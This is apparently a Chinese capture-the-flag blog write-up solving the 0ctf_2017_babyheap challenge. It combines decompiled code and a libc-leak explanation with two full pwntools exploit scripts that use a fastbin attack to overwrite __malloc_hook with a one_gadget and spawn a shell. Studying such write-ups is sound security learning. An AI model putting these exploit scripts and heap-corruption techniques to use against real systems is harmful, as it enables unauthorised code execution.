---
title: '第一个fastbin_attack的题'
published: 2026-10-29
description: '啊啊啊啊啊啊啊啊啊啊啊啊这个爱弥斯好好看啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊'
author: 'dxfaker'
image: '/images/post/b4064f2acfb72aa9840fc8fd48dcc0a6.jpg'
tags: ['wp','pwn']
category: 'wp'
toc: true
---

# 写在前面

这个是遇到的第一个用fastbin attack的题

因为没学过，还是狠狠的恶补了一下

# 0ctf_2017_babyheap

wsl指令下载glibc2.23	

```bash
# 1. 克隆工具
git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one

# 2. 给脚本执行权限
chmod a+x build download extract update_list

# 3. 更新可用列表
./update_list

# 4. 查找 2.23 的 amd64 包名（按你的题选，一般选 ubuntu 版本）
cat list | grep 2.23

# 5. 下载（以 2.23-0ubuntu11.3_amd64 为例，按上一步实际列表里的名字填）
./download 2.23-0ubuntu11.3_amd64
```

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = sub_B70(a1, a2, a3);
  while ( 1 )
  {
    menu();
    switch ( read_input() )
    {
      case 1LL:
        add(v4);
        break;
      case 2LL:
        edit(v4);                               // the length you want
        break;
      case 3LL:
        delete(v4);                             // no uaf
        break;
      case 4LL:
        dump(v4);
        break;
      case 5LL:
        return 0;
      default:
        continue;
    }
  }
}
```

版本是2.23

```c
void __fastcall add(__int64 a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int input; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      input = read_input();
      if ( input > 0 )
      {
        if ( input > 4096 )
          input = 4096;
        v3 = calloc(input, 1u);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = input;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", i);
      }
      return;
    }
  }
}
```

常规add，非bss管理

```c
__int64 __fastcall edit(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_input();
  v2 = result;
  if ( (unsigned int)result < 0x10 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = read_input();                    // 依旧不限长度改
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

checksec

```bash
(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ checksec pwn_patched
[*] '/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap/pwn_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
```

delete

```c
__int64 __fastcall delete(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_input();
  v2 = result;
  if ( (unsigned int)result < 0x10 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0;
    }
  }
  return result;
}
```

可以看到

```c
free(*(void **)(24LL * v2 + a1 + 16));
```

传入的只有一个指针

也就是根据chunk头自己的大小进行free

```c
int __fastcall dump(__int64 a1)
{
  int result; // eax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = read_input();
  v2 = result;
  if ( (unsigned int)result < 0x10 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      write_heap(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      return puts(byte_14F1);
    }
  }
  return result;
}
```

dump展示的是整个chunk

看到的检查，就先考虑把libc给泄露出来，然后进行fastbin attack，考虑改写__malloc_hook以及free_hook

那么我们要怎么才能把libc泄露出来呢



与leyi的解法不一样,我的见识比较浅薄，故优先考虑我知道的unsorted bin中fd/bk指向main_arena + offset,然后找个机会打印出来就好了

![9a9762bde9260a3cdd723ae67aa23935](/images/post/9a9762bde9260a3cdd723ae67aa23935.jpg)

泄露的一图流

通过不限长度改进行改写，然后在free的时候就会带着实际掌控的堆块进入unsorted bin

再进行一次calloc的时候会把1给所谓切走,然后把指向main_arena + offset的2给dump出来，加以计算便可以得到libc基址

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', 'bash', '-c']

exe = ELF("./pwn_patched")
context.binary = exe
p =  remote("ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com")
# p =  process("./pwn_patched")
libc = ELF("./libc.so.6")

def add_chunk(size):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    
def edit_chunk(idx, size, content):
    p.recvuntil(b'Command: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
    
def free_chunk(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    
def show_content(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    


fake_chunk = flat({
            0x100: 0x110,
            0x108: 0x221,}, filler = '\x00')
            
            
add_chunk(256)
add_chunk(256)
add_chunk(256)
add_chunk(256)
edit_chunk(0, len(fake_chunk), fake_chunk)
# gdb.attach(p)
free_chunk(1)
add_chunk(256)
show_content(2)
# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E ' __free_hook$| __malloc_hook$| __realloc_hook$| system$'
# 5654: 00000000000453a0    45 FUNC    WEAK   DEFAULT   13 system
# 6241: 00000000003c4b10     8 OBJECT  WEAK   DEFAULT   33 __malloc_hook
# 6248: 00000000003c67a8     8 OBJECT  WEAK   DEFAULT   34 __free_hook
# 7294: 00000000003c4b08     8 OBJECT  WEAK   DEFAULT   33 __realloc_hook
# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E 'main_arena'
   # 915: 00000000003c4b20  2192 OBJECT  LOCAL  DEFAULT   33 main_arena
   # (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ one_gadget ./libc.so.6
# 0x4527a execve("/bin/sh", rsp+0x30, environ)
p.recvuntil(b'Content: ')   # 吃掉 "Content: "
p.recv(1)                   # 吃掉那个 '\n'
leak = u64(p.recv(8).ljust(8, b'\x00'))
libc.address = leak - 88 - 0x3c4b20
system_add = libc.address + 0x453a0
free_hook  = libc.address + 0x3c67a8 
malloc_hook = 0x3c4b10 + libc.address
fake_chunk_addr = malloc_hook - 0x23 
fb_freehook = free_hook - 0x18
bk_freehook = free_hook - 0x10
# one_gadget = libc.address + 0x4527a  我草死你的吗

```

你可以看到

```bash
[DEBUG] Received 0x140 bytes:
    00000000  43 6f 6e 74  65 6e 74 3a  20 0a 78 fb  cf b9 b2 7f  │Cont│ent:│ ·x·│····│
    00000010  00 00 78 fb  cf b9 b2 7f  00 00 00 00  00 00 00 00  │··x·│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000100  00 00 00 00  00 00 00 00  00 00 0a 31  2e 20 41 6c  │····│····│···1│. Al│
    00000110  6c 6f 63 61  74 65 0a 32  2e 20 46 69  6c 6c 0a 33  │loca│te·2│. Fi│ll·3│
    00000120  2e 20 46 72  65 65 0a 34  2e 20 44 75  6d 70 0a 35  │. Fr│ee·4│. Du│mp·5│
    00000130  2e 20 45 78  69 74 0a 43  6f 6d 6d 61  6e 64 3a 20  │. Ex│it·C│omma│nd: │
    00000140
Content:
x\xfbϹ\xb2\x7f\x00\x00x\xfbϹ\xb2\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: $
```

泄露出来libc基址之后我我们要怎么操作呢

我们考虑一种经典的fastbin attack

![Screenshot_20261029_162454_com.microsoft.office..](/images/post/Screenshot_20261029_162454_com.microsoft.office...jpg)

更改已经free掉的堆块上的指针

然后再申请两次，就申请到目标地址附近的地址，以此为fake chunk，然后再传onegadget布置好了，再进行add就可以触发了，但这样做也只是本地拿到了shell

那么问题出在哪里呢

题目的libc.so.6跟你下载的真的一样吗

![4aab05c577ec3139f277fd3ca68c6d95](/images/post/4aab05c577ec3139f277fd3ca68c6d95.png)

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', 'bash', '-c']

exe = ELF("./pwn_patched")
context.binary = exe
# p =  remote("ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com")
p =  process("./pwn_patched")
libc = ELF("./libc.so.6")

def add_chunk(size):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    
def edit_chunk(idx, size, content):
    p.recvuntil(b'Command: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
    
def free_chunk(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    
def show_content(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(idx).encode())
    


fake_chunk = flat({
            0x100: 0x110,
            0x108: 0x221,}, filler = '\x00')
            
            
add_chunk(256)
add_chunk(256)
add_chunk(256)
add_chunk(256)
edit_chunk(0, len(fake_chunk), fake_chunk)
# gdb.attach(p)
free_chunk(1)
add_chunk(256)
show_content(2)
gdb.attach(p)
# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E ' __free_hook$| __malloc_hook$| __realloc_hook$| system$'
# 5654: 00000000000453a0    45 FUNC    WEAK   DEFAULT   13 system
# 6241: 00000000003c4b10     8 OBJECT  WEAK   DEFAULT   33 __malloc_hook
# 6248: 00000000003c67a8     8 OBJECT  WEAK   DEFAULT   34 __free_hook
# 7294: 00000000003c4b08     8 OBJECT  WEAK   DEFAULT   33 __realloc_hook
# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E 'main_arena'
   # 915: 00000000003c4b20  2192 OBJECT  LOCAL  DEFAULT   33 main_arena
   # (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ one_gadget ./libc.so.6
# 0x4527a execve("/bin/sh", rsp+0x30, environ)
p.recvuntil(b'Content: ')   # 吃掉 "Content: "
p.recv(1)                   # 吃掉那个 '\n'
leak = u64(p.recv(8).ljust(8, b'\x00'))
libc.address = leak - 88 - 0x3c4b20
system_add = libc.address + 0x453a0
free_hook  = libc.address + 0x3c67a8 
malloc_hook = 0x3c4b10 + libc.address
fake_chunk_addr = malloc_hook - 0x23 
fb_freehook = free_hook - 0x18
bk_freehook = free_hook - 0x10
# one_gadget = libc.address + 0x4527a  我草死你的吗
one_gadget = libc.address + 0x4526a   # 原版 libc-2.23.so，不是 11.3 的 0x4527a

# 如果还不行，再换：
# 
log.info(f"leak         = {hex(leak)}")
log.info(f"libc.address = {hex(libc.address)}")
log.info(f"one_gadget   = {hex(one_gadget)}   off={hex(one_gadget - libc.address)}")
log.info(f"fake_chunk   = {hex(fake_chunk_addr)}   off={hex(fake_chunk_addr - libc.address)}")
log.info(f"malloc_hook  = {hex(malloc_hook)}   off={hex(malloc_hook - libc.address)}")
add_chunk(96)#4
add_chunk(96)#5
add_chunk(96)#6
add_chunk(96)#7
free_chunk(5)

fakechunk = flat({
    0x60: 0x60,
    0x68: 0x71,
    0x70: fake_chunk_addr
},filler = b'\x00')

edit_chunk(4, len(fakechunk), fakechunk)

add_chunk(96)#7
add_chunk(96)#8
# payload = p64(0) + p64(system_add)
# edit_chunk(8, len(payload), payload)
# add_chunk(0x10)
# edit_chunk(9, 8, b'/bin/sh\x00')
# free_chunk(9)
payload = b'\x00' * 0x13 + p64(one_gadget)
edit_chunk(8, len(payload), payload)
add_chunk(0x10) 
p.interactive()
```













